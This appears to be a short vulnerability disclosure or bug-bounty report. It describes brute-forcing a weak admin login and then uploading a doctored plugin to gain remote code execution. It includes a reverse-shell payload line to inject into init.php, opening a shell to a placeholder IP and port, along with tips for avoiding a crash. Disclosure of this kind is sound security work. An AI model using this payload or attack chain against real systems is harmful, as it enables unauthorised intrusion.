It could make attacker to easily brute force or password guessed to gain access to admin-center and upload malicious plugin to gain remote code execution.


Affected Webpage: admin-center login page + plugin install

Step 1 : as there are no password requirement or no password complexity implemented in account creation for admin-center, we can start from brute force.
Screenshot below shows we can login with username “admin” with password “1”

Step 3 : there are some requirement like package.json must exist and we found that the target has implemented async to check every classes and function . but we can download a proper plugin from their customer portal and edit / add in the init.php, this is the safest way to prevent system crash when trigger the payload.
Note: please put & at the end of the line to prevent system crash after payload triggered and init.php is the best place to inject payload
Example : exec ("/bin/bash -c 'bash -i >& /dev/tcp/IP/Port 0>&1 &'");
